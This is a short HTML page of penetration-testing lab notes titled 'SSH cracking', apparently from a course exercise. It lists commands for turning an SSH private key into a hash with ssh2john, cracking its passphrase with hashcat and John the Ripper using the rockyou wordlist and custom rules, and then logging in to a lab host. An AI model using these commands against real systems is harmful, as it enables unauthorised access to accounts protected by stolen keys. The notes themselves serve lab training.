@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SSH cracking</title>
+</head><body>chmod 600 id_rsa &nbsp;{modifying permissions of private key of ssh}<br/>
+<br/>
+hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force<br/>
+<br/>
+sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf' {transferring to john the ripper}<br/>
+<br/>
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash<br/>
+<br/>
+ssh -i id_rsa -p 2222 dave@192.168.50.201 connection to ssh<br/>
+<br/>
+ssh2john id_rsa &gt; ssh.hash<br/>
+<br/>
+john --wordlist=/usr/share/wordlists/rockyou.txt decrypted.txt &nbsp; <br/>
+<br/>
+[List.Rules:sshRules] &nbsp; {add to start of Rules File}<br/>
+sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf'</body></html>
